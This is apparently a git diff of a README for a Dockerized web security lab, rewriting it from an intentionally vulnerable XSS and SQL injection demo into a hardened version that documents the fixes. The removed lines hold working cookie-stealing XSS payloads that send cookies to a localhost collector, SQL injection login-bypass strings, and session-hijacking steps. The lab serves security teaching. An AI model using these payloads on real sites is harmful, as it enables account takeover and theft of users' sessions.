@@ -1,7 +1,6 @@
-# XSS Cookie Stealing Lab
+# Secure Comment System
 
-A educational security lab demonstrating Cross-Site Scripting (XSS) and authentication vulnerabilities. 
-**For educational purposes only - do not use on real websites!**
+A secure version of the previously vulnerable XSS Cookie Stealing Lab. This version demonstrates proper security practices to prevent common web vulnerabilities.
 
 ## Prerequisites
 
@@ -24,140 +23,52 @@ A educational security lab demonstrating Cross-Site Scripting (XSS) and authenti
 
 3. Wait about 30 seconds for MySQL to initialize fully.
 
-4. Access the applications:
-   - Vulnerable App: http://localhost:8080
-   - Attacker's Log: http://localhost:8081/logs.php
+4. Access the application:
+   - Secure App: http://localhost:8080
 
-## Vulnerabilities Demonstrated
+## Security Improvements
 
-### 1. Authentication Vulnerabilities
+This branch contains a secure version of the application that addresses all the security vulnerabilities present in the original version. Here's what has been fixed:
 
-The application has several authentication weaknesses:
+### 1. SQL Injection Prevention
 
-a) SQL Injection in Login:
-```sql
-SELECT * FROM users WHERE username='$username' AND password='$password'
-```
-Can be bypassed with:
-- Username: `admin' --`
-- Password: (anything)
-
-b) SQL Injection in Signup:
-```sql
-INSERT INTO users (username, password) VALUES ('$username', '$password')
-```
-Can be exploited to create malicious users.
-
-c) Insecure Cookie Handling:
+**Original Vulnerability:**
 ```php
-setcookie('user_session', $user_id, time() + 3600, '/', '', false, false);
-```
-- No HttpOnly flag
-- No Secure flag
-- No SameSite attribute
-- Uses predictable user IDs
-
-### 2. XSS + Cookie Theft Attack Chain
-
-1. Create an account and log in
-2. Post a comment with the XSS payload:
-   ```html
-   <script>
-   new Image().src = "http://localhost:8081/steal.php?cookie=" + encodeURIComponent(document.cookie);
-   </script>
-   ```
-3. When other users view the page, their cookies are sent to the attacker server
-4. View stolen cookies at http://localhost:8081/logs.php
-5. Use stolen cookies to impersonate users:
-   ```javascript
-   document.cookie = "user_session=STOLEN_COOKIE_VALUE; path=/";
-   ```
-
-### 3. Session Hijacking Steps
-
-1. Steal user's cookie using XSS
-2. Copy the user_session value
-3. Create a new browser session
-4. Set the stolen cookie using browser dev tools
-5. Access http://localhost:8080
-6. You're now logged in as the victim
-
-### Cookie Theft Attack Steps
-
-1. **Steal the Cookie**
-   ```html
-   <script>
-   fetch('http://localhost:8081/steal.php?cookie=' + encodeURIComponent(document.cookie))
-   </script>
-   ```
-   
-   Alternative payload:
-   ```html
-   <script>
-   new Image().src = "http://localhost:8081/steal.php?cookie=" + encodeURIComponent(document.cookie);
-   </script>
-   ```
-
-2. **Use the Stolen Cookie**
-   - Copy the user_session value from the attacker logs
-   - Open a new private/incognito window
-   - Open browser dev tools (F12)
-   - In the Console tab, paste:
-   ```javascript
-   document.cookie = "user_session=STOLEN_COOKIE_VALUE; path=/"
-   ```
-   - Navigate to http://localhost:8080
-   - You should now be logged in as the victim
-
-3. **Important Notes**
-   - The cookie authentication is intentionally vulnerable
-   - No additional verification is performed
-   - Session is automatically created from cookie
-   - All actions will be performed as the victim user
-
-4. **Prevention**
-   ```php
-   // Secure cookie settings
-   setcookie('user_session', $value, [
-       'expires' => time() + 3600,
-       'path' => '/',
-       'secure' => true,
-       'httponly' => true,
-       'samesite' => 'Strict'
-   ]);
-   ```
-
-## Attack Scenarios
-
-### Scenario 1: Cookie Theft
-1. Attacker creates account
-2. Posts XSS payload in comment
-3. Victim views page
-4. Attacker captures victim's cookie
-5. Attacker uses cookie to impersonate victim
-
-### Scenario 2: SQL Injection
-1. Attacker uses `admin' --` as username
-2. Bypasses authentication
-3. Posts malicious content as admin
-
-### Scenario 3: Combined Attack
-1. Use SQL injection to create admin account
-2. Post XSS payload as admin
-3. Steal cookies from all users
-4. Impersonate multiple users
-
-## Prevention Measures
-
-1. SQL Injection Prevention:
-```php
-$stmt = $mysqli->prepare("SELECT * FROM users WHERE username=? AND password=?");
-$stmt->bind_param("ss", $username, $password);
+$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
 ```
 
-2. Secure Cookie Settings:
+**Secure Implementation:**
 ```php
-setcookie('user_session', $value, [
+$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->bind_param("s", $username);
+```
+
+All database queries now use prepared statements with parameterized queries to prevent SQL injection attacks.
+
+### 2. XSS Prevention
+
+**Original Vulnerability:**
+```php
+echo "<p>" . $row['content'] . "</p>";
+```
+
+**Secure Implementation:**
+```php
+echo "<p>" . htmlspecialchars($row['content']) . "</p>";
+```
+
+All user-generated content is now properly escaped using `htmlspecialchars()` to prevent Cross-Site Scripting (XSS) attacks.
+
+### 3. Secure Cookie Handling
+
+**Original Vulnerability:**
+```php
+setcookie('user_session', $_SESSION['user_id'], time() + 3600, '/', '', false, false);
+```
+
+**Secure Implementation:**
+```php
+setcookie('user_session', $_SESSION['user_id'], [
     'expires' => time() + 3600,
     'path' => '/',
     'secure' => true,
@@ -166,15 +77,66 @@ setcookie('user_session', $value, [
 ]);
 ```
 
-3. XSS Prevention:
+Cookies now use secure settings:
+- HttpOnly flag to prevent JavaScript access
+- Secure flag to ensure HTTPS-only transmission
+- SameSite attribute to prevent CSRF attacks
+
+### 4. Password Hashing
+
+**Original Vulnerability:**
 ```php
-$content = htmlspecialchars($content, ENT_QUOTES, 'UTF-8');
+$query = "INSERT INTO users (username, password) VALUES ('$username', '$password')";
 ```
 
-4. Password Hashing:
+**Secure Implementation:**
 ```php
 $hashed_password = password_hash($password, PASSWORD_DEFAULT);
+$stmt = $mysqli->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
+$stmt->bind_param("ss", $username, $hashed_password);
 ```
+
+Passwords are now properly hashed using PHP's `password_hash()` function with bcrypt.
+
+### 5. Input Validation
+
+**Original Vulnerability:**
+No input validation was performed.
+
+**Secure Implementation:**
+```php
+if (empty($username) || empty($password)) {
+    $error = "Username and password are required";
+} else if (strlen($password) < 6) {
+    $error = "Password must be at least 6 characters long";
+}
+```
+
+All user inputs are now validated before processing.
+
+### 6. Error Handling
+
+**Original Vulnerability:**
+Error messages revealed sensitive information.
+
+**Secure Implementation:**
+```php
+if ($result === false) {
+    $error = "Database error. Please try again later.";
+}
+```
+
+Generic error messages are now displayed to users, with detailed errors logged server-side.
+
+## Additional Improvements
+
+1. **Database Persistence**: Tables are only created if they don't exist, ensuring user data persists across sessions.
+
+2. **Error Handling**: Added better error handling and debugging output to help troubleshoot issues.
+
+3. **Session Management**: Improved session handling to ensure users stay logged in properly.
+
+4. **UI Improvements**: Enhanced the user interface for better usability.
 
 ## Troubleshooting
 
@@ -191,21 +153,9 @@ $hashed_password = password_hash($password, PASSWORD_DEFAULT);
    - Check for SQL errors
    - Make sure you're using the same username/password for login that you used for signup
 
-3. **Cookie Stealing Not Working**
-   - Ensure both applications are accessible
-   - Check browser console for errors
-   - Verify attacker server permissions
-   - Check logs directory permissions
-
-4. **Comments Not Saving**
+3. **Comments Not Saving**
    - Verify you're properly logged in
    - Check for SQL errors in the logs
-   - Make sure your comment doesn't contain unescaped quotes
-
-5. **Session Issues**
-   - Clear browser cookies and try again
-   - Verify session is being set correctly
-   - Check for proper cookie authentication
 
 ### Resetting the Application
 
@@ -218,79 +168,6 @@ docker-compose down -v
 # Rebuild and start
 docker-compose up --build
 ```
-
-## Legal Disclaimer
-
-This project is for educational purposes only. Using these techniques against real websites without explicit permission is illegal and unethical. Always:
-
-- Practice in controlled environments only
-- Get written permission before testing
-- Follow responsible disclosure
-- Respect privacy and data protection laws
-
-## SQL Injection Vulnerabilities
-
-### 1. Login Bypass
-The login system is vulnerable to SQL injection. Here are some example payloads:
-
-a) Basic Authentication Bypass:
-```sql
-Username: admin' --
-Password: anything
-```
-This works because:
-- `admin'` matches the username
-- `--` comments out the password check
-
-b) Login as First User:
-```sql
-Username: ' OR '1'='1' LIMIT 1 --
-Password: anything
-```
-This works because:
-- `OR '1'='1'` makes the WHERE clause always true
-- `LIMIT 1` selects the first user
-- `--` comments out the password check
-
-c) Advanced Injection:
-```sql
-Username: ' UNION SELECT 1,1,'admin','admin123',NOW() --
-Password: anything
-```
-
-### 2. Signup SQL Injection
-The signup form is also vulnerable:
-
-a) Create Admin Account:
-```sql
-Username: admin
-Password: '); -- 
-```
-
-b) Bypass Username Check:
-```sql
-Username: admin' OR '1'='1
-Password: password
-```
-
-### 3. Cookie Theft + SQL Injection Chain
-Combine both vulnerabilities:
-
-1. Use SQL injection to gain admin access:
-```sql
-Username: admin' --
-Password: anything
-```
-
-2. Post XSS payload as admin:
-```html
-<script>
-fetch('http://localhost:8081/steal.php?cookie=' + encodeURIComponent(document.cookie))
-</script>
-```
-
-3. Steal cookies from other users
-4. Use stolen cookies to impersonate users
 
 ## Development and Updates
 
@@ -319,27 +196,6 @@ When you make changes to the code, you need to rebuild and restart the container
    docker-compose up --build
    ```
 
-3. Quick Development Cycle:
-   ```bash
-   # Restart single container
-   docker-compose restart vulnerable-app
-
-   # View logs
-   docker-compose logs -f vulnerable-app
-   ```
-
-4. Debugging:
-   ```bash
-   # Check container status
-   docker-compose ps
-
-   # View all logs
-   docker-compose logs
-
-   # Check database
-   docker-compose exec db mysql -udbuser -pdbpassword vulnerable_db
-   ```
-
 ### Development Tips
 
 1. **View Logs**
@@ -349,7 +205,6 @@ When you make changes to the code, you need to rebuild and restart the container
 
    # Specific container
    docker-compose logs -f vulnerable-app
-   docker-compose logs -f attacker-server
    docker-compose logs -f db
    ```
 
@@ -363,39 +218,34 @@ When you make changes to the code, you need to rebuild and restart the container
    SELECT * FROM comments;
    ```
 
-3. **Test Changes**
-   - Make code changes
-   - `docker-compose up --build`
-   - Check logs for errors
-   - Test functionality
-   - Reset if needed: `docker-compose down -v`
+## Security Best Practices
 
-4. **Debug Mode**
-   Add to PHP files:
-   ```php
-   error_reporting(E_ALL);
-   ini_set('display_errors', 1);
-   ```
+1. **SQL Injection Prevention**:
+   - Always use prepared statements
+   - Never concatenate user input directly into SQL queries
+   - Use parameterized queries for all database operations
 
-## Recent Fixes
+2. **XSS Prevention**:
+   - Always escape output with `htmlspecialchars()`
+   - Consider Content Security Policy (CSP) headers
+   - Validate and sanitize all user inputs
 
-The application has been updated with the following improvements:
+3. **Secure Cookie Handling**:
+   - Use HttpOnly flag to prevent JavaScript access
+   - Use Secure flag to ensure HTTPS-only transmission
+   - Use SameSite attribute to prevent CSRF attacks
+   - Consider using session tokens instead of user IDs
 
-1. **Database Persistence**: Tables are now only created if they don't exist, ensuring user data persists across sessions.
+4. **Password Security**:
+   - Always hash passwords with modern algorithms (bcrypt, Argon2)
+   - Never store passwords in plaintext
+   - Implement password complexity requirements
+   - Consider implementing account lockout after failed attempts
 
-2. **Cookie Authentication**: Improved cookie handling to properly authenticate users across pages.
-
-3. **Error Handling**: Added better error handling and debugging output to help troubleshoot issues.
-
-4. **SQL Escaping**: Fixed issues with special characters in comments by properly escaping strings.
-
-5. **Session Management**: Fixed session handling to ensure users stay logged in properly.
-
-6. **UI Improvements**: Enhanced the user interface for better usability.
-
-7. **Logging**: Improved logging for both the vulnerable app and attacker server.
-
-These fixes maintain the intentional vulnerabilities for educational purposes while making the application more stable and usable.
+5. **Input Validation**:
+   - Validate all user inputs on both client and server side
+   - Implement proper error handling
+   - Use whitelisting approach for input validation
 
 ## License
 
